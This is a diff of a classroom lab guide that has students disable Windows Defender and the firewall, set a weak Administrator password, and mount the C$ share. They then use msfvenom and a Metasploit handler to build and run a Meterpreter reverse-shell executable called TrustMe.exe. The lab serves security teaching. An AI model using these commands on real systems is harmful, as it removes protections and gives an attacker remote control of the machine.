@@ -5,11 +5,13 @@
 
 Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:
 
-![](attachments/OpeningPowershell.png)
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/bb7c958d-9879-44d3-a6e2-441139a94caa" />
 
 Next, run the following command in the **Powershell** terminal:
 
-<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
+```ps
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
 ![](attachments/applocker_disabledefender.png)
 This will disable **Defender** for this session.
@@ -18,12 +20,16 @@ If you get angry red errors, that is **Ok**, it means **Defender** is not runnin
 
 Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 
-<pre> netsh advfirewall set allprofiles state off</pre>
+```ps
+netsh advfirewall set allprofiles state off
+```
 
 
 Next, set a password for the Administrator account that you can remember
 
-<pre>net user Administrator password1234</pre>
+```ps
+net user Administrator password1234
+```
 
 Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
@@ -37,18 +43,28 @@ Before we move on from our Powershell window, lets get our IP by running the fol
 
 Write this IP down so we can use it again later.
 
-Let's continue by opening a **Kali** terminal
 
-![](attachments/OpeningKaliInstance.png)
 
-Alternatively, you can click on the **Kali** icon in the taskbar.
 
-![](attachments/TaskbarKaliIcon.png)
+- Open **Command Prompt**
+
+<img width="85" height="103" alt="image" src="https://github.com/user-attachments/assets/b2c7dbad-d57b-40d0-9318-ca8d40176c22" />
+
+- **SSH** into the **Linux** machine
+```bash
+ssh ubuntu@linux.cloudlab.lan
+```
+
+<img width="247" height="25" alt="image" src="https://github.com/user-attachments/assets/69706053-abe6-4de7-aa48-d9fd739ec4a7" />
+
+
 
 
 We need to run the following commands in order to mount our remote system to the correct directory:
 
-<pre>sudo su -</pre>
+```bash
+sudo su -
+```
 
 <pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>
 
@@ -64,9 +80,11 @@ Run the following command to navigate into the mounted directory:
 
 <pre>cd /mnt/windows-share</pre>
 
-Before we run the next commands, we need to get the IP of our Kali System (AKA our Linux IP Adress). Lets do so by running the following:
+Before we run the next commands, we need to get the IP of our Linux System (AKA our Linux IP Adress). Lets do so by running the following:
 
-<pre>ifconfig</pre>
+```bash
+ifconfig
+```
 
 ![](attachments/ifconfig.png)
 
@@ -74,31 +92,58 @@ Before we run the next commands, we need to get the IP of our Kali System (AKA o
 
 Run the following commands to start a simple backdoor and backdoor listener: 
 
-<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
+```bash
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe
+```
 
-Let's start the **Metasploit** Handler.  Open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.
+Let's start the **Metasploit** Handler.  
 
-![](attachments/TaskbarKaliIcon.png)
+
+
+- Open **Command Prompt**
+
+<img width="85" height="103" alt="image" src="https://github.com/user-attachments/assets/b2c7dbad-d57b-40d0-9318-ca8d40176c22" />
+
+- **SSH** into the **Linux** machine
+```bash
+ssh ubuntu@linux.cloudlab.lan
+```
+
+<img width="247" height="25" alt="image" src="https://github.com/user-attachments/assets/69706053-abe6-4de7-aa48-d9fd739ec4a7" />
+
+
 
 Let's become root.
 
-<pre>sudo su -</pre>
+```bash
+sudo su -
+```
 
 Now let's start the **Metasploit** Handler
 
-<pre>msfconsole -q</pre>
+```bash
+msfconsole -q
+```
 
 We are going to run the following commands to correctly set the parameters:
 
-<pre>use exploit/multi/handler</pre>
+```bash
+use exploit/multi/handler
+```
 
-<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
+```bash
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
 
-<pre>set LHOST [Your Linux IP Address]</pre>
+```bash
+set LHOST [Your Linux IP Address]
+```
 
 Remember, **Your IP will be different!**
 
-<pre>exploit</pre>
+```bash
+exploit
+```
 
 It should look like this:
 
@@ -124,7 +169,7 @@ Then run it with the following:
 
  <pre>TrustMe.exe</pre>
 
-Back at your Kali terminal, you should have a metasploit session!
+Back at your Linux terminal, you should have a metasploit session!
 
 ![](attachments/meterpretersession.png)
 
@@ -166,6 +211,7 @@ Please be sure to destroy the lab environment!
 [Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
 
 ---
+
 
 
 
